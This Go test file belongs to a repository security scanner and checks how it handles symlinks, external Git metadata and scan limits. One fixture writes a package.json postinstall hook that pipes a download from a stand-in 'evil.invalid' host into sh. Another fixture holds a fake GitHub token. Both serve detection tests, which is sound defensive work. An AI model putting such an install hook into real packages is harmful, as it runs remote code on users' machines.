package scan

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestDirectorySymlinkScansSameContent(t *testing.T) {
	repo := t.TempDir()
	writeFixture(t, repo, "package.json", `{"scripts":{"postinstall":"curl https://evil.invalid/p | sh"}}`)
	link := filepath.Join(t.TempDir(), "repo")
	if err := os.Symlink(repo, link); err != nil {
		t.Skipf("symlink unavailable: %v", err)
	}
	directCoverage, directFindings := New(Options{}).Scan(context.Background(), repo)
	linkCoverage, linkFindings := New(Options{}).Scan(context.Background(), link)
	if !directCoverage.Complete || !linkCoverage.Complete || directCoverage.FilesScanned != linkCoverage.FilesScanned || !hasRule(directFindings, "PKG-001") || !hasRule(linkFindings, "PKG-001") {
		t.Fatalf("symlink scan differed: direct=%+v/%+v linked=%+v/%+v", directCoverage, directFindings, linkCoverage, linkFindings)
	}
}

func TestGitMetadataCannotReadExternalSymlink(t *testing.T) {
	repo := t.TempDir()
	private := filepath.Join(t.TempDir(), "private")
	if err := os.WriteFile(private, []byte("ghp_abcdefghijklmnopqrstuvwxyz1234567890"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(private, filepath.Join(repo, ".git", "config")); err != nil {
		t.Skipf("symlink unavailable: %v", err)
	}
	coverage, findings := New(Options{}).Scan(context.Background(), repo)
	if coverage.Complete || coverage.BytesScanned != 0 || hasRule(findings, "SECRET-001") {
		t.Fatalf("external metadata was scanned or marked complete: %+v %+v", coverage, findings)
	}
}

func TestLinkedGitDirectoryIsIncomplete(t *testing.T) {
	repo := t.TempDir()
	writeFixture(t, repo, "metadata/config", "[core]\n hooksPath = hooks\n")
	if err := os.Symlink("metadata", filepath.Join(repo, ".git")); err != nil {
		t.Skipf("directory symlink unavailable: %v", err)
	}
	coverage, _ := New(Options{}).Scan(context.Background(), repo)
	if coverage.Complete || !strings.Contains(strings.Join(coverage.Skipped, " "), "linked Git metadata") {
		t.Fatalf("linked Git metadata appeared complete: %+v", coverage)
	}
}

func TestGitMetadataUsesRepositoryLimits(t *testing.T) {
	repo := t.TempDir()
	writeFixture(t, repo, ".git/config", strings.Repeat("x", 4096))
	writeFixture(t, repo, ".git/config.worktree", strings.Repeat("x", 4096))
	limits := DefaultLimits()
	limits.MaxFiles = 1
	limits.MaxFileBytes = 128
	coverage, _ := New(Options{Limits: limits}).Scan(context.Background(), repo)
	if coverage.Complete || coverage.FilesScanned > 1 || coverage.BytesScanned > 128 {
		t.Fatalf("Git metadata bypassed limits: %+v", coverage)
	}
}
